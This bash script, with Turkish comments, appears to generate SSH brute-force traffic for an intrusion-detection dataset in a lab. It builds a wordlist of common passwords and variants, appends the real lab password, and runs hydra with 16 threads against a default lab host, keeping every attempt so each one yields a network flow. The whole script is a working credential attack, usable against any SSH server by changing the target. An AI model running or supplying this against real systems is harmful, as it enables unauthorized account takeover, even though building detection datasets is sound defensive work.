#!/usr/bin/env bash
# 02 bruteforce_ssh — hydra ile SSH kaba kuvvet (lab hedefi: svc)
# Dengeli dataset için ~400 deneme (her deneme ≈ 1 SSH akışı).
set -uo pipefail
VIC="${1:-10.10.10.30}"; USER="${2:-svc}"; PASS="${3:-CHANGE_ME_weak_lab_password}"
WL=/tmp/ids_wordlist.txt
# ~400 parolalık wordlist: yaygın parolalar + üretilmiş çeşitlemeler + gerçek parola
{
  printf '%s\n' password 123456 12345678 qwerty abc123 letmein admin root toor \
    welcome monkey dragon master login passw0rd sunshine princess football \
    iloveyou starwars hello freedom whatever trustno1 superman batman \
    shadow michael jennifer hunter buster soccer harley ranger daniel \
    000000 111111 121212 654321 696969 123123 azerty qazwsx michelle
  for i in $(seq 1 350); do echo "Pass${i}word!"; done
  echo "$PASS"   # gerçek parola (başarı garantisi)
} | awk '!seen[$0]++' > "$WL"
echo "[brute] hydra -l $USER ssh://$VIC ($(wc -l < "$WL") parola, -t 16)"
# -f: ilk bulunca dur değil → tüm denemeler akış üretsin diye -f'yi KALDIRDIK
hydra -l "$USER" -P "$WL" -t 16 -I -o /tmp/ids_hydra.out ssh://"$VIC" || true
echo "[brute] sonuç:"; grep -i "password:" /tmp/ids_hydra.out 2>/dev/null | head -3 || true
echo "[brute] done"
